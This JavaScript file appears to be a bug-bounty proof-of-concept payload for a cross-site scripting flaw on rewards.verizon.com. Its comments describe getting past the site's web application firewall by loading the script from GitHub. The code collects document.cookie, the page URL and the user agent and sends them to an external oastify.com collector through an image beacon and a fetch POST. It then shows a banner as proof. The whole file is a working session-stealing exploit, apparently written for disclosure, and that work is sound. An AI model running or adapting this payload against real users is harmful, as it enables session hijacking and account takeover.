// REP-127 imported payload. Hosted at https://LVtriage.github.io/2-p.js, loaded via
// import() by 1-deliver.html, executed in the rewards.verizon.com origin.
//
// Fetched from GitHub (not through rewards.verizon.com), so SigSci never inspects it:
// document.cookie works here even though a raw "document.cookie" in the vz_jwt payload
// itself is blocked (HTTP 406). This is the impact proof: arbitrary attacker JavaScript
// running in the victim's authenticated rewards.verizon.com session.

(function () {
  var COLLECTOR = "https://f5lkkvcsn7dkluz8o2noiocytpzgn6bv.oastify.com/b";

  var proof =
    "origin=" + location.origin +
    "|url=" + location.href +
    "|cookie=" + document.cookie +
    "|ua=" + navigator.userAgent;

  // Beacon 1: image GET (no CORS needed; survives most CSP connect-src configs)
  try { new Image().src = COLLECTOR + "?" + encodeURIComponent(proof); } catch (e) {}

  // Beacon 2: fetch fallback (single https:// - fixed)
  try {
    fetch(COLLECTOR, { method: "POST", mode: "no-cors", body: proof });
  } catch (e) {}

  // Visible marker (appended to <html> so it shows even before <body> completes) for the
  // proof screenshot: a red bar reading "REP-127 XSS executed in https://rewards.verizon.com".
  try {
    var d = document.createElement("div");
    d.textContent = "REP-127 XSS executed in " + location.origin;
    d.style.cssText =
      "position:fixed;top:0;left:0;right:0;z-index:2147483647;" +
      "background:#b00020;color:#fff;font:16px/2.2 sans-serif;text-align:center";
    document.documentElement.appendChild(d);
  } catch (e) {}
})();
